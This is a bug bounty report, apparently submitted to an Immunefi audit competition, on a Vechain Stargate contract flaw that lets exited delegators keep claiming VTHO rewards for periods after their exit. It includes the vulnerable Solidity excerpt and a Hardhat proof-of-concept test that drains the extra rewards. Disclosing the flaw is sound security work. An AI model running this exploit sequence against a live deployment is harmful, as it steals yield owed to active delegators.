# 59563 sc high exited delegators can claim rewards indefinitely after exit

**Submitted on Nov 13th 2025 at 15:11:46 UTC by @dray for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59563
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:** Theft of unclaimed yield

## Description

### Brief/Intro

A critical flaw in `Stargate._claimableDelegationPeriods` allows users who have exited their delegations to continue claiming rewards indefinitely from periods that occur after their exit. Once a delegator calls `requestDelegationExit` and completes their exit period, they should no longer earn rewards. However, the contract's logic incorrectly computes the claimable period range for exited delegations, enabling them to claim from all future periods as long as their validator continues producing blocks. Each call to `claimRewards` siphons VTHO that should have been distributed exclusively to active delegators, creating a permanent reward drain.

## Vulnerability Details

### Background

Expected lifecycle:

{% stepper %}
{% step %}

### Stake and delegate

User stakes VET → mints NFT.
{% endstep %}

{% step %}

### Delegate

User delegates the NFT → VET locked in `ProtocolStaker`; rewards accrue period by period.
{% endstep %}

{% step %}

### Request exit

User requests delegation exit → `ProtocolStaker` sets `endPeriod` for the delegation.
{% endstep %}

{% step %}

### Exit completes

When the period completes, the delegation status becomes EXITED.
{% endstep %}

{% step %}

### No new rewards expected

From this point, no new rewards should accrue; user can withdraw stake or leave the NFT idle.
{% endstep %}
{% endstepper %}

#### Actual behavior

Because of how `Stargate._claimableDelegationPeriods` computes the next claim window, an EXITED delegation retains a moving claim range that advances with every new validator period. The contract continues to treat the exited delegator as eligible for rewards, so repeated calls to `claimRewards` siphon future earnings forever.

### Root Cause

The bug lives in `_claimableDelegationPeriods` (lines \~880–927 of `Stargate.sol`). Relevant excerpt:

```solidity
uint32 nextClaimablePeriod = $.lastClaimedPeriod[_tokenId] + 1;
if (nextClaimablePeriod < startPeriod) {
    nextClaimablePeriod = startPeriod;
}

if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod
) {
    return (nextClaimablePeriod, endPeriod);
}

if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

When the delegator first claims after exit:

* `nextClaimablePeriod` equals the first unclaimed period (still ≤ `endPeriod`).
* The `endPeriod > nextClaimablePeriod` branch executes, returning `[nextClaimable, endPeriod]`.
* `claimRewards` sets `lastClaimedPeriod` to `endPeriod`.

On the next call:

* `nextClaimablePeriod = endPeriod + 1`.
* The exit branch condition `endPeriod > nextClaimablePeriod` fails.
* The fallback branch sees `nextClaimablePeriod < currentValidatorPeriod` (validator kept producing blocks).
* It therefore returns `(endPeriod + 1, completedPeriods)` – periods entirely beyond `endPeriod`.

Since `_claimableRewardsForPeriod` and `delegatorsEffectiveStake[validator]` still reflect the old stake (no checkpoint subtraction until unstake or redelegation), the exited delegator receives a legitimate share of each future period’s rewards.

### Why exit does not stop the leakage

* `_updatePeriodEffectiveStake(..., false)` runs only when the delegator withdraws or redelegates; simply exiting does not reduce the validator’s effective stake history.
* `lastClaimedPeriod` is updated after every claim but no flag signals that the delegation ended permanently.
* The `endPeriod > nextClaimablePeriod` guard uses a strict inequality. After successfully claiming through the end period, the guard no longer triggers and the fallback logic treats the exited delegator as active.

## Impact Details

### Direct impact

* Exited delegators can keep farming VTHO rewards indefinitely without restaking.
* Honest active delegators see reduced rewards each period, proportional to the attacker’s historical effective stake.

## Proof of Concept

<details>

<summary>View PoC test (Hardhat / TypeScript)</summary>

```javascript
import { expect } from "chai";
import {
    MyERC20,
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFTMock,
    StargateNFTMock__factory,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../../../typechain-types";
import { getOrDeployContracts } from "../../helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";
const LEVEL_ID = 1;
const REWARDS_PER_PERIOD = 10n ** 17n; // 0.1 VTHO from ProtocolStakerMock
const VALIDATOR_STATUS_ACTIVE = 2;
const DELEGATION_STATUS_ACTIVE = 2;
const DELEGATION_STATUS_EXITED = 3;

// Max claimable periods is configured in the test config
const MAX_CLAIMABLE_PERIODS = 8;

describe("shard-u4: Stargate: Rewards exit leakage", () => {
    let stargateContract: Stargate;
    let stargateNFTMock: StargateNFTMock;
    let protocolStakerMock: ProtocolStakerMock;
    let legacyNodesMock: TokenAuctionMock;
    let vthoTokenContract: MyERC20;
    let deployer: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    let victim: HardhatEthersSigner;
    let validator: HardhatEthersSigner;

    beforeEach(async () => {
        process.env.VITE_APP_ENV = "devnet";
        const config = createLocalConfig();
        [deployer] = await ethers.getSigners();

        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        const stargateNFTMockFactory = new StargateNFTMock__factory(deployer);
        stargateNFTMock = await stargateNFTMockFactory.deploy();
        await stargateNFTMock.waitForDeployment();

        const vthoTokenContractFactory = new MyERC20__factory(deployer);
        const tokenContract = await vthoTokenContractFactory.deploy(
            deployer.address,
            deployer.address
        );
        await tokenContract.waitForDeployment();
        const tokenContractBytecode = await ethers.provider.getCode(tokenContract);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, tokenContractBytecode]);

        const legacyNodesMockFactory = new TokenAuctionMock__factory(deployer);
        legacyNodesMock = await legacyNodesMockFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.STARGATE_NFT_CONTRACT_ADDRESS = await stargateNFTMock.getAddress();
        config.MAX_CLAIMABLE_PERIODS = MAX_CLAIMABLE_PERIODS;
        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        attacker = contracts.otherAccounts[0];
        victim = contracts.otherAccounts[1];
        validator = contracts.otherAccounts[2];
        vthoTokenContract = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);

        await protocolStakerMock.addValidation(validator.address, 120);
        await protocolStakerMock.helper__setStargate(stargateContract.target);
        await protocolStakerMock.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_ACTIVE);

        await stargateNFTMock.helper__setLevel({
            id: LEVEL_ID,
            name: "Strength",
            isX: false,
            maturityBlocks: 10,
            scaledRewardFactor: 150,
            vetAmountRequiredToStake: ethers.parseEther("1"),
        });

        await stargateNFTMock.helper__setToken({
            tokenId: 10000,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: ethers.parseEther("1"),
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });

        await stargateNFTMock.helper__setLegacyNodes(legacyNodesMock);

        await vthoTokenContract
            .connect(deployer)
            .mint(stargateContract, ethers.parseEther("1000"));
    });

    it("allows an exited delegator to keep draining rewards from future periods", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);

        await stargateContract.connect(attacker).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        const attackerTokenId = await stargateNFTMock.getCurrentTokenId();

        await stargateContract.connect(victim).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        const victimTokenId = await stargateNFTMock.getCurrentTokenId();

        await stargateContract.connect(attacker).delegate(attackerTokenId, validator.address);
        await stargateContract.connect(victim).delegate(victimTokenId, validator.address);

        await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 9);
        await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        await stargateContract.connect(victim).claimRewards(victimTokenId);

        await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 10);
        await stargateContract.connect(attacker).requestDelegationExit(attackerTokenId);

        await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 11);
        await stargateContract.connect(attacker).claimRewards(attackerTokenId);

        console.log("\n=== After claiming through exit period ===");

        const statusAfterExit = await stargateContract.getDelegationStatus(attackerTokenId);
        expect(statusAfterExit).to.equal(DELEGATION_STATUS_EXITED);

        const victimStatus = await stargateContract.getDelegationStatus(victimTokenId);
        expect(victimStatus).to.equal(DELEGATION_STATUS_ACTIVE);

        await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            11 + MAX_CLAIMABLE_PERIODS
        );

        const delegationDetails = await stargateContract.getDelegationDetails(attackerTokenId);
        const endPeriod = Number(delegationDetails.endPeriod);

        console.log("endPeriod from delegation:", endPeriod);

        const [firstExtraPeriod, lastExtraPeriod] =
            await stargateContract.claimableDelegationPeriods(attackerTokenId);
        const firstExtraPeriodNumber = Number(firstExtraPeriod);
        const lastExtraPeriodNumber = Number(lastExtraPeriod);
        
        console.log(
            "claimableDelegationPeriods returned:",
            firstExtraPeriodNumber,
            "to",
            lastExtraPeriodNumber
        );
        console.log("Are these > endPeriod?", firstExtraPeriodNumber > endPeriod, lastExtraPeriodNumber > endPeriod);
        
        expect(firstExtraPeriodNumber).to.be.greaterThan(endPeriod);
        expect(lastExtraPeriodNumber).to.be.greaterThan(endPeriod);

        const leakedPeriods = lastExtraPeriodNumber - firstExtraPeriodNumber + 1;
        expect(leakedPeriods).to.be.greaterThan(0);

        const attackerBalanceBefore = await vthoTokenContract.balanceOf(attacker.address);
        const leakedPreview = await stargateContract["claimableRewards(uint256)"](
            attackerTokenId
        );
        expect(leakedPreview).to.be.greaterThan(0n);
        const victimPreviewBefore = await stargateContract["claimableRewards(uint256)"](
            victimTokenId
        );
        await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        const attackerBalanceAfter = await vthoTokenContract.balanceOf(attacker.address);

        const leakedAmount = attackerBalanceAfter - attackerBalanceBefore;
        expect(leakedAmount).to.equal(leakedPreview);

        const statusStillExited = await stargateContract.getDelegationStatus(attackerTokenId);
        expect(statusStillExited).to.equal(DELEGATION_STATUS_EXITED);

        const victimBalanceBefore = await vthoTokenContract.balanceOf(victim.address);
        const victimPreviewAfter = await stargateContract["claimableRewards(uint256)"](
            victimTokenId
        );
        expect(victimPreviewAfter).to.equal(victimPreviewBefore);
        await stargateContract.connect(victim).claimRewards(victimTokenId);
        const victimBalanceAfter = await vthoTokenContract.balanceOf(victim.address);

        const victimAmount = victimBalanceAfter - victimBalanceBefore;
        expect(victimAmount).to.equal(victimPreviewAfter);
        expect(victimAmount).to.be.greaterThan(0n);
    });
});
```

</details>

## References

(Links to code or documentation can be added here if available.)
